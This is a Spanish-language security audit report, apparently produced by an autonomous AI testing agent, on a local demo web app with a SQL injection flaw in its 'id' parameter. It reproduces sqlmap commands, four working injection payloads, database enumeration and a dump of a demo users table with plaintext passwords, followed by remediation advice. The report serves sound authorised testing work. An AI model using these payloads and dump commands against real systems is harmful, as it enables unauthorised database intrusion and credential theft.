# Informe de Auditoría de Seguridad – SQL Injection
**Fecha:** 2026-04-25T12:02:14Z  
**Objetivo:** http://web.dev.local:8083  
**Analista:** Agente Autónomo DAST (SQLi)  
**Modelo:** claude-sonnet-4.6  

---

## 1. Resumen Ejecutivo

Se realizó un análisis dinámico de seguridad (DAST) sobre la aplicación web disponible en `http://web.dev.local:8083`. Se identificó y explotó con éxito una vulnerabilidad crítica de **SQL Injection** en el parámetro GET `id`. La explotación permitió extraer la totalidad de la base de datos `sqli_demo`, incluyendo credenciales en texto plano de 8 usuarios.

**Nivel de riesgo:** 🔴 CRÍTICO

---

## 2. Reconocimiento (Fase 1)

### Tecnología detectada
- **Sistema Operativo:** Linux (Debian)
- **Servidor Web:** Apache 2.4.65
- **Lenguaje Backend:** PHP 8.1.33
- **Base de datos:** MySQL 5 (MariaDB fork)

### Vectores de entrada identificados
| Tipo   | Parámetro | Método | URL                            |
|--------|-----------|--------|--------------------------------|
| GET    | `id`      | GET    | http://web.dev.local:8083/?id= |
| GET    | `Submit`  | GET    | (botón de envío del formulario)|

La página principal expone un formulario de búsqueda de usuarios (`<form method="GET">`) con el campo `id`. Al enviar `?id=1&Submit=Submit`, la aplicación devuelve datos del usuario directamente desde la base de datos sin sanitización aparente.

---

## 3. Descubrimiento de Vulnerabilidades (Fase 2)

### Herramienta utilizada
`sqlmap 1.9.10#stable`

### Comando ejecutado
```bash
sqlmap -u "http://web.dev.local:8083/?id=1&Submit=Submit" --batch --level=3 --risk=2 -p id
```

### Resultado
El parámetro `id` fue confirmado como **inyectable** mediante 4 técnicas distintas:

| Tipo                  | Título                                                                 |
|-----------------------|------------------------------------------------------------------------|
| Boolean-based blind   | AND boolean-based blind - WHERE or HAVING clause (subquery - comment)  |
| Error-based           | MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR) |
| Time-based blind      | MySQL >= 5.0.12 AND time-based blind (query SLEEP)                     |
| UNION query           | Generic UNION query (NULL) - 2 columns                                 |

### Payloads identificados
```
# Boolean-based blind
id=5029' AND 6551=(SELECT (CASE WHEN (6551=6551) THEN 6551 ELSE (SELECT 2428 UNION SELECT 1249) END))-- -

# Error-based
id=5029' OR (SELECT 8777 FROM(SELECT COUNT(*),CONCAT(0x71717a6a71,(SELECT (ELT(8777=8777,1))),0x717a716a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- mTmP

# Time-based blind
id=5029' AND (SELECT 7778 FROM (SELECT(SLEEP(5)))JVzb)-- YZiE

# UNION query
id=5029' UNION ALL SELECT NULL,CONCAT(0x71717a6a71,0x7266786d565148786279414c49575057486e62576c7a784d474c536d514662424c6c7042556d474b,0x717a716a71)-- -
```

---

## 4. Explotación Activa (Fase 3)

### 4.1 Obtención de usuario de base de datos y bases de datos disponibles

**Comando:**
```bash
sqlmap -u "http://web.dev.local:8083/?id=1&Submit=Submit" --batch --current-user --dbs
```

**Resultado:**
- **Usuario actual de BD:** `root@%` *(privilegio máximo)*
- **Bases de datos disponibles:**
  - `information_schema`
  - `mysql`
  - `performance_schema`
  - `sqli_demo`
  - `sys`

### 4.2 Enumeración de tablas

**Comando:**
```bash
sqlmap -u "http://web.dev.local:8083/?id=1&Submit=Submit" --batch -D sqli_demo --tables
```

**Resultado:**
- Base de datos `sqli_demo` contiene: tabla `users`

### 4.3 Extracción completa de datos (Dump)

**Comando:**
```bash
sqlmap -u "http://web.dev.local:8083/?id=1&Submit=Submit" --batch -D sqli_demo -T users --dump
```

**Datos extraídos – Tabla `sqli_demo.users`:**

| user_id | username   | first_name | last_name | email               | password    |
|---------|------------|------------|-----------|---------------------|-------------|
| 1       | admin      | John       | Doe       | admin@example.com   | password123 |
| 2       | jsmith     | Jane       | Smith     | jane@example.com    | secret456   |
| 3       | bjohnson   | Bob        | Johnson   | bob@example.com     | mypass789   |
| 4       | awilliams  | Alice      | Williams  | alice@example.com   | qwerty123   |
| 5       | cbrown     | Charlie    | Brown     | charlie@example.com | password    |
| 6       | ddavis     | Diana      | Davis     | diana@example.com   | secure123   |
| 7       | emiller    | Eve        | Miller    | eve@example.com     | hackme      |
| 8       | fwilson    | Frank      | Wilson    | frank@example.com   | admin123    |

⚠️ **Las contraseñas se almacenan en texto plano**, lo que agrava significativamente la criticidad de la vulnerabilidad.

---

## 5. Hallazgos Consolidados

| ID    | Vulnerabilidad   | Parámetro | Método | Severidad  | CWE      |
|-------|-----------------|-----------|--------|------------|----------|
| F-001 | SQL Injection    | `id`      | GET    | 🔴 Crítica | CWE-89   |
| F-002 | Contraseñas en texto plano | BD `sqli_demo` | - | 🔴 Crítica | CWE-256 |

---

## 6. Conclusión

La aplicación web en `http://web.dev.local:8083` presenta una vulnerabilidad **crítica de SQL Injection** que permite a un atacante no autenticado:

1. **Enumerar** todas las bases de datos del servidor MySQL.
2. **Extraer** la totalidad de los datos de la aplicación, incluyendo credenciales de usuarios.
3. **Operar con privilegios de `root`** sobre el gestor de base de datos, lo que potencialmente permite leer/escribir ficheros del sistema operativo o ejecutar comandos.

La raíz del problema es la concatenación directa del parámetro `id` en la consulta SQL sin uso de consultas parametrizadas ni validación de entrada.

### Recomendaciones
- **Inmediato:** Utilizar *prepared statements* / consultas parametrizadas (PDO o MySQLi con parámetros vinculados).
- **Inmediato:** Cambiar todas las contraseñas comprometidas.
- **Corto plazo:** Almacenar contraseñas con hashing seguro (bcrypt, Argon2).
- **Corto plazo:** Aplicar el principio de mínimo privilegio en la cuenta de base de datos (no usar `root`).
- **Medio plazo:** Implementar WAF y monitorización de consultas anómalas.
